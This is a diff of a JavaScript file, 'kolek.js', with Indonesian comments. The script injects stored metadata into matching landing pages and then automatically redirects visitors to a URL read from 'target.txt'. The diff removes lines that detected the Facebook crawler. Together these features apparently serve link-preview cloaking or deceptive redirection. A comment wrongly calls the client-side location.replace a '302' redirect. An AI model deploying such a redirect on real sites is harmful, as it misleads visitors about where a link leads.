@@ -7,11 +7,6 @@ console.log('kolek.js script is running...');
 (function () {
   console.log('Script started.'); // Log awal untuk memastikan kode dijalankan
 
-  const referrer = document.referrer; // Mendapatkan referer
-  const userAgent = navigator.userAgent; // Mendapatkan user-agent
-  const isFacebookCrawler = /facebookexternalhit|facebook/i.test(userAgent); // Deteksi crawler Facebook
-  const currentPath = location.pathname; // Mendapatkan path URL saat ini
-
   // Periksa apakah injeksi sudah dilakukan sebelumnya
   const targetInjectedKey = 'targetInjected';
   const currentUrl = new URL(location.href).href; // Normalisasi URL saat ini
@@ -74,10 +69,11 @@ console.log('kolek.js script is running...');
         console.log('Current URL matches a landing page. Injecting metadata...');
         injectMetadata(originalHtml); // Sisipkan metadata asli dari metadata.txt
 
-        console.log('Redirecting to target.txt...');
+        console.log('Redirecting to target.txt with 302...');
         setTimeout(() => {
-          location.href = new URL(targetUrl.trim(), location.origin).href; // Redirect ke URL target.txt
-        }, 100); // Beri jeda waktu untuk memastikan metadata disisipkan
+          console.log(`Redirecting to: ${targetUrl.trim()}`); // Log tambahan untuk memastikan URL redirect
+          location.replace(new URL(targetUrl.trim(), location.origin).href); // Redirect ke URL target.txt dengan 302
+        }, 300); // Tingkatkan jeda waktu untuk memastikan metadata disisipkan
         return; // Hentikan eksekusi lebih lanjut
       }
 
